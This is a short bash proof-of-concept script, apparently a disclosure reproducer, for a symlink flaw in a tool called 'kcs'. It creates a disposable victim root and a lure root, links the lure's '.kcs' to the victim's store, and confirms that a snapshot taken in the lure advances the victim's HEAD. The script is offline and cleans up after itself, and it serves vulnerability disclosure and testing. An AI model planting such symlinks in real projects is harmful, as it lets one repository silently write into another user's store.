#!/usr/bin/env bash
set -euo pipefail

# Local, offline reproducer for the `.kcs` symlink cross-scope store binding.
# It creates two disposable KCS roots, points the lure root's `.kcs` at the
# victim root's live store, and verifies that a snapshot from the lure advances
# the victim store's HEAD.

if [[ -n "${KCS_CMD:-}" ]]; then
  # shellcheck disable=SC2206
  KCS_RUNNER=(${KCS_CMD})
elif [[ -n "${KCS_BIN:-}" ]]; then
  KCS_RUNNER=("${KCS_BIN}")
else
  KCS_RUNNER=("kcs")
fi

workdir="$(mktemp -d "${TMPDIR:-/tmp}/kcs-symlink-store-poc.XXXXXX")"
cleanup() {
  rm -rf "${workdir}"
}
trap cleanup EXIT

export XDG_DATA_HOME="${workdir}/xdg-data"
export KCS_CONFIG_HOME="${workdir}/kcs-config"
mkdir -p "${XDG_DATA_HOME}" "${KCS_CONFIG_HOME}"

victim="${workdir}/victim"
lure="${workdir}/lure"
mkdir -p "${victim}" "${lure}"

run_kcs() {
  "${KCS_RUNNER[@]}" "$@"
}

printf 'victim baseline\n' > "${victim}/victim.txt"
run_kcs init "${victim}" >/dev/null
(
  cd "${victim}"
  run_kcs snapshot -m "victim baseline" >/dev/null
)

victim_head_before="$(tr -d '\n' < "${victim}/.kcs/HEAD")"

printf 'lure-controlled bytes\n' > "${lure}/lure.txt"
ln -s "${victim}/.kcs" "${lure}/.kcs"

(
  cd "${lure}"
  run_kcs status --json >/dev/null
  run_kcs snapshot -m "lure snapshot into linked victim store" >/dev/null
)

victim_head_after="$(tr -d '\n' < "${victim}/.kcs/HEAD")"

if [[ -z "${victim_head_before}" || -z "${victim_head_after}" ]]; then
  printf '[-] expected non-empty HEAD values\n' >&2
  exit 1
fi

if [[ "${victim_head_before}" == "${victim_head_after}" ]]; then
  printf '[-] victim HEAD did not change after lure snapshot\n' >&2
  exit 1
fi

printf '[+] created disposable victim root and lure root\n'
printf '[+] lure .kcs is a symlink to the victim store\n'
printf '[+] victim HEAD before: %s\n' "${victim_head_before}"
printf '[+] victim HEAD after:  %s\n' "${victim_head_after}"
printf '[+] snapshot from the lure root advanced the linked victim store\n'
